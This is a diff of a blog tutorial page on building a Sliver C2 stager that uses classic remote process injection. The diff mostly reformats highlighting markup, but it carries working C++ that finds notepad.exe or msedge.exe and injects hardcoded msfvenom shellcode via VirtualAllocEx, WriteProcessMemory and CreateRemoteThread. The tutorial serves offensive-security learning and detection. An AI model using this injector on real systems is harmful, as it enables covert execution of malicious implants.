@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
   <head>
-    <meta name="generator" content="Hugo 0.101.0" />
+    <meta name="generator" content="Hugo 0.92.2" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Learning Sliver C2 (07) - Stagers: Process Injection | text/plain</title>
@@ -242,7 +242,7 @@ in existing processes. Apart from the stager itself I&#39;ll also show how it mi
 detected by Sysmon logging.
 "><meta itemprop="datePublished" content="2022-10-09T00:00:00+00:00" />
 <meta itemprop="dateModified" content="2022-10-09T00:00:00+00:00" />
-<meta itemprop="wordCount" content="4453"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png"/>
+<meta itemprop="wordCount" content="4619"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png"/>
 <meta itemprop="keywords" content="c2,sliver,tutorial,stagers,process injection,sysmon," />
     <script async src="/js/baffle.js"></script>
     <header>
@@ -252,7 +252,7 @@ detected by Sysmon logging.
   <circle cx="16" cy="16" r="14" />
   <path d="M16 8 L16 16 20 20" />
 </svg>
-<span>21 minute read</span>
+<span>22 minute read</span>
 <svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
   <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
 </svg>
@@ -378,32 +378,32 @@ Below you can find the <code>main</code> function, which shows the three functio
 <code>GetTargetPID</code> has to give us the process ID (PID) to inject into.
 <code>GetShellcode</code> is responsible for loading the payload into a <code>Shellcode</code> struct.
 Finally, <code>Inject</code> is what injects the shellcode into the process.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> {
-</span></span><span style="display:flex;"><span>    BYTE<span style="color:#f92672">*</span> pcData;
-</span></span><span style="display:flex;"><span>    DWORD dwSize;
-</span></span><span style="display:flex;"><span>};
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetTargetPID</span>();
-</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">GetShellcode</span>(Shellcode<span style="color:#f92672">*</span> shellcode);
-</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">Inject</span>(DWORD dwPID, Shellcode shellcode);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//::ShowWindow(::GetConsoleWindow(), SW_HIDE); // hide console window
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
-</span></span><span style="display:flex;"><span>    DWORD pid <span style="color:#f92672">=</span> GetTargetPID();
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>; }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> shellcode;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GetShellcode(<span style="color:#f92672">&amp;</span>shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>; }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Injecting %ld bytes into PID %ld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, shellcode.dwSize, pid);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Inject(pid, shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">3</span>; }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Let&rsquo;s look at these three functions in order.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> {
+    BYTE<span style="color:#f92672">*</span> pcData;
+    DWORD dwSize;
+};
+
+
+DWORD <span style="color:#a6e22e">GetTargetPID</span>();
+BOOL <span style="color:#a6e22e">GetShellcode</span>(Shellcode<span style="color:#f92672">*</span> shellcode);
+BOOL <span style="color:#a6e22e">Inject</span>(DWORD dwPID, Shellcode shellcode);
+
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+    <span style="color:#75715e">//::ShowWindow(::GetConsoleWindow(), SW_HIDE); // hide console window
+</span><span style="color:#75715e"></span>    
+    DWORD pid <span style="color:#f92672">=</span> GetTargetPID();
+    <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>; }
+
+    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> shellcode;
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GetShellcode(<span style="color:#f92672">&amp;</span>shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>; }
+
+    printf(<span style="color:#e6db74">&#34;Injecting %ld bytes into PID %ld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, shellcode.dwSize, pid);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Inject(pid, shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">3</span>; }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Let&rsquo;s look at these three functions in order.
 To find a good PID we need to know what we are looking for.
 In this example, we want to be able to specify a list of candidate process names
 and the function should give us the first PID of a process that matches them.
@@ -416,33 +416,34 @@ is no need to ask <code>GetTargetPID</code> about it so accordingly, using 0 for
 <p>The function can be written as seen below.
 <code>GetTargetPID</code> defines the list of process names,
 then uses <code>GetFirstPIDProclist</code> to get a PID.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetFirstPIDProclist</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">**</span> aszProclist, DWORD dwSize);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetTargetPID</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> aszProclist[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;notepad.exe&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;msedge.exe&#34;</span>
-</span></span><span style="display:flex;"><span>    };
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> GetFirstPIDProclist(aszProclist, <span style="color:#66d9ef">sizeof</span>(aszProclist) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(aszProclist[<span style="color:#ae81ff">0</span>]));
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>The logic for <code>GetFirstPIDProclist</code> is simple too.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">DWORD <span style="color:#a6e22e">GetFirstPIDProclist</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">**</span> aszProclist, DWORD dwSize);
+
+DWORD <span style="color:#a6e22e">GetTargetPID</span>() {
+    <span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> aszProclist[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;notepad.exe&#34;</span>,
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;msedge.exe&#34;</span>
+    };
+    <span style="color:#66d9ef">return</span> GetFirstPIDProclist(aszProclist, <span style="color:#66d9ef">sizeof</span>(aszProclist) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(aszProclist[<span style="color:#ae81ff">0</span>]));
+}
+
+</code></pre></div><p>The logic for <code>GetFirstPIDProclist</code> is simple too.
 Once again, I delegate the hard part to a helper function <code>GetFirstPIDProcname</code>,
 which shall return the PID of the first function matching a process name.
 For now, we just iterate over all candidate names and return a PID for the first hit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetFirstPIDProcname</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> szProcname);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetFirstPIDProclist</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">**</span> aszProclist, DWORD dwSize) {
-</span></span><span style="display:flex;"><span>    DWORD pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwSize; i<span style="color:#f92672">++</span>) {
-</span></span><span style="display:flex;"><span>        pid <span style="color:#f92672">=</span> GetFirstPIDProcname(aszProclist[i]);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> pid;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Time to get serious and write <code>GetFirstPIDProcname</code>.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">DWORD <span style="color:#a6e22e">GetFirstPIDProcname</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> szProcname);
+
+DWORD <span style="color:#a6e22e">GetFirstPIDProclist</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">**</span> aszProclist, DWORD dwSize) {
+    DWORD pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwSize; i<span style="color:#f92672">++</span>) {
+        pid <span style="color:#f92672">=</span> GetFirstPIDProcname(aszProclist[i]);
+        <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+            <span style="color:#66d9ef">return</span> pid;
+        }
+    }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Time to get serious and write <code>GetFirstPIDProcname</code>.
 There is a Windows API to take a snapshot of process-related data.
 It works as follows.
 First use
@@ -461,46 +462,46 @@ For an official example, see the <a href="https://learn.microsoft.com/en-us/wind
 It has a field <code>szExeFile</code> which is the name as a string.</p>
 <p>Below you can see the implementation.
 As usual when you get handles to things, don&rsquo;t forget to close them with <code>CloseHandle</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetFirstPIDProcname</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> szProcname) {
-</span></span><span style="display:flex;"><span>    HANDLE hProcessSnapshot <span style="color:#f92672">=</span> CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (INVALID_HANDLE_VALUE <span style="color:#f92672">==</span> hProcessSnapshot) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    PROCESSENTRY32 pe32;
-</span></span><span style="display:flex;"><span>    pe32.dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Process32First(hProcessSnapshot, <span style="color:#f92672">&amp;</span>pe32)) {
-</span></span><span style="display:flex;"><span>        CloseHandle(hProcessSnapshot);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    DWORD pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (Process32Next(hProcessSnapshot, <span style="color:#f92672">&amp;</span>pe32)) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (lstrcmpiW(szProcname, pe32.szExeFile) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
-</span></span><span style="display:flex;"><span>            pid <span style="color:#f92672">=</span> pe32.th32ProcessID;
-</span></span><span style="display:flex;"><span>            printf(<span style="color:#e6db74">&#34;Process found: %d %ls</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pid, pe32.szExeFile);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    CloseHandle(hProcessSnapshot);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> pid;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Now on to <code>GetShellcode</code>.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">DWORD <span style="color:#a6e22e">GetFirstPIDProcname</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> szProcname) {
+    HANDLE hProcessSnapshot <span style="color:#f92672">=</span> CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span style="color:#ae81ff">0</span>);
+    <span style="color:#66d9ef">if</span> (INVALID_HANDLE_VALUE <span style="color:#f92672">==</span> hProcessSnapshot) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Process32First(hProcessSnapshot, <span style="color:#f92672">&amp;</span>pe32)) {
+        CloseHandle(hProcessSnapshot);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    }
+
+    DWORD pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">while</span> (Process32Next(hProcessSnapshot, <span style="color:#f92672">&amp;</span>pe32)) {
+        <span style="color:#66d9ef">if</span> (lstrcmpiW(szProcname, pe32.szExeFile) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+            pid <span style="color:#f92672">=</span> pe32.th32ProcessID;
+            printf(<span style="color:#e6db74">&#34;Process found: %d %ls</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pid, pe32.szExeFile);
+            <span style="color:#66d9ef">break</span>;
+        }
+    }
+
+    CloseHandle(hProcessSnapshot);
+    <span style="color:#66d9ef">return</span> pid;
+}
+</code></pre></div><p>Now on to <code>GetShellcode</code>.
 For development, I just take the message box shellcode from an array
 and put that into the <code>Shellcode</code> struct.
 That is, the payload is hardcoded into the stager:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">// msfvenom -f c --arch x64 -p windows/x64/messagebox EXITFUNC=thread
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>BYTE aShellcode[] <span style="color:#f92672">=</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>...
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2c\x20\x66\x72\x6f\x6d\x20\x4d\x53\x46\x21\x00\x4d\x65\x73</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x73\x61\x67\x65\x42\x6f\x78\x00</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">GetShellcode</span>(Shellcode<span style="color:#f92672">*</span> shellcode) {
-</span></span><span style="display:flex;"><span>    (<span style="color:#f92672">*</span>shellcode).pcData <span style="color:#f92672">=</span> aShellcode;
-</span></span><span style="display:flex;"><span>    (<span style="color:#f92672">*</span>shellcode).dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(aShellcode);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>This is a viable approach for short shellcode.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">// msfvenom -f c --arch x64 -p windows/x64/messagebox EXITFUNC=thread
+</span><span style="color:#75715e"></span>BYTE aShellcode[] <span style="color:#f92672">=</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51</span><span style="color:#e6db74">&#34;</span>
+...
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2c\x20\x66\x72\x6f\x6d\x20\x4d\x53\x46\x21\x00\x4d\x65\x73</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x73\x61\x67\x65\x42\x6f\x78\x00</span><span style="color:#e6db74">&#34;</span>;
+
+BOOL <span style="color:#a6e22e">GetShellcode</span>(Shellcode<span style="color:#f92672">*</span> shellcode) {
+    (<span style="color:#f92672">*</span>shellcode).pcData <span style="color:#f92672">=</span> aShellcode;
+    (<span style="color:#f92672">*</span>shellcode).dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(aShellcode);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+}
+</code></pre></div><p>This is a viable approach for short shellcode.
 Do it with a Sliver implant though and you get a pretty large compiled binary
 (and a pretty large source code file too).
 In the next subsection, we&rsquo;ll change the implementation such that Sliver implant
@@ -511,11 +512,11 @@ First, we need a handle to the process.
 <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess</a>
 is the function that returns such things.
 We call it this way:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>HANDLE hProcess <span style="color:#f92672">=</span> OpenProcess(
-</span></span><span style="display:flex;"><span>        PROCESS_VM_OPERATION <span style="color:#f92672">|</span> PROCESS_VM_WRITE <span style="color:#f92672">|</span> PROCESS_CREATE_THREAD,
-</span></span><span style="display:flex;"><span>        FALSE,
-</span></span><span style="display:flex;"><span>        dwPID);
-</span></span></code></pre></div><p>Apart from the PID you must give it an argument <code>dwDesiredAccess</code>,
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">HANDLE hProcess <span style="color:#f92672">=</span> OpenProcess(
+        PROCESS_VM_OPERATION <span style="color:#f92672">|</span> PROCESS_VM_WRITE <span style="color:#f92672">|</span> PROCESS_CREATE_THREAD,
+        FALSE,
+        dwPID);
+</code></pre></div><p>Apart from the PID you must give it an argument <code>dwDesiredAccess</code>,
 with which you specify the
 <a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights">process access rights</a>
 you would like to have.
@@ -529,13 +530,13 @@ The following three rights are relevant here:</p>
 <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx</a>
 to allocate memory for the shellcode.
 We call it this way:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>LPVOID pRemoteAddr <span style="color:#f92672">=</span> VirtualAllocEx(
-</span></span><span style="display:flex;"><span>        hProcess, 
-</span></span><span style="display:flex;"><span>        NULL, 
-</span></span><span style="display:flex;"><span>        shellcode.dwSize, 
-</span></span><span style="display:flex;"><span>        (MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT), 
-</span></span><span style="display:flex;"><span>        PAGE_EXECUTE_READ);
-</span></span></code></pre></div><p>Two of this function&rsquo;s arguments deserve more explanations. The first is <code>flAllocationType</code>.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">LPVOID pRemoteAddr <span style="color:#f92672">=</span> VirtualAllocEx(
+        hProcess, 
+        NULL, 
+        shellcode.dwSize, 
+        (MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT), 
+        PAGE_EXECUTE_READ);
+</code></pre></div><p>Two of this function&rsquo;s arguments deserve more explanations. The first is <code>flAllocationType</code>.
 Process memory can be &ldquo;reserved&rdquo;, meaning that the process will reserve space for it in it&rsquo;s virtual address space,
 but no physical memory is allocated yet.
 Memory can also be &ldquo;committed&rdquo;, in which case it reserved and also allocated physically.
@@ -561,202 +562,202 @@ even though official documentation says it does not work, because Windows tempor
 This is done with a function
 <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a>,
 which we call like this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>BOOL err <span style="color:#f92672">=</span> WriteProcessMemory(
-</span></span><span style="display:flex;"><span>        hProcess,
-</span></span><span style="display:flex;"><span>        pRemoteAddr,
-</span></span><span style="display:flex;"><span>        shellcode.pcData,
-</span></span><span style="display:flex;"><span>        shellcode.dwSize,
-</span></span><span style="display:flex;"><span>        NULL);
-</span></span></code></pre></div><p>The arguments we set should be self-explanatory, so let&rsquo;s just move on and start a thread.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">BOOL err <span style="color:#f92672">=</span> WriteProcessMemory(
+        hProcess,
+        pRemoteAddr,
+        shellcode.pcData,
+        shellcode.dwSize,
+        NULL);
+</code></pre></div><p>The arguments we set should be self-explanatory, so let&rsquo;s just move on and start a thread.
 We use <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread</a>
 for it.
 It&rsquo;s arguments should be equally self-explanatory.
 We call it this way:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>HANDLE hThread <span style="color:#f92672">=</span> CreateRemoteThread(
-</span></span><span style="display:flex;"><span>        hProcess, 
-</span></span><span style="display:flex;"><span>        NULL, 
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>, 
-</span></span><span style="display:flex;"><span>        (LPTHREAD_START_ROUTINE)pRemoteAddr, 
-</span></span><span style="display:flex;"><span>        NULL, 
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>, 
-</span></span><span style="display:flex;"><span>        NULL);
-</span></span></code></pre></div><p>The four functions calls discussed above are all we need for process injection.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">HANDLE hThread <span style="color:#f92672">=</span> CreateRemoteThread(
+        hProcess, 
+        NULL, 
+        <span style="color:#ae81ff">0</span>, 
+        (LPTHREAD_START_ROUTINE)pRemoteAddr, 
+        NULL, 
+        <span style="color:#ae81ff">0</span>, 
+        NULL);
+</code></pre></div><p>The four functions calls discussed above are all we need for process injection.
 Adding a bit of error checking and handle closing, we get this code:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">Inject</span>(DWORD dwPID, Shellcode shellcode) {
-</span></span><span style="display:flex;"><span>    HANDLE hProcess <span style="color:#f92672">=</span> OpenProcess(PROCESS_VM_OPERATION <span style="color:#f92672">|</span> PROCESS_VM_WRITE <span style="color:#f92672">|</span> PROCESS_CREATE_THREAD, FALSE, dwPID);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hProcess) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; };
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    LPVOID pRemoteAddr <span style="color:#f92672">=</span> VirtualAllocEx(hProcess, NULL, shellcode.dwSize, (MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT), PAGE_EXECUTE_READ);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pRemoteAddr) {
-</span></span><span style="display:flex;"><span>        CloseHandle(hProcess);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    };
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>WriteProcessMemory(hProcess, pRemoteAddr, shellcode.pcData, shellcode.dwSize, NULL)) {
-</span></span><span style="display:flex;"><span>        CloseHandle(hProcess);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    };
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    HANDLE hThread <span style="color:#f92672">=</span> CreateRemoteThread(hProcess, NULL, <span style="color:#ae81ff">0</span>, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, <span style="color:#ae81ff">0</span>, NULL);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hThread <span style="color:#f92672">!=</span> NULL) {
-</span></span><span style="display:flex;"><span>        WaitForSingleObject(hThread, <span style="color:#ae81ff">500</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        CloseHandle(hThread);
-</span></span><span style="display:flex;"><span>        CloseHandle(hProcess);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    CloseHandle(hProcess);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Combining all the code and adding the required includes,
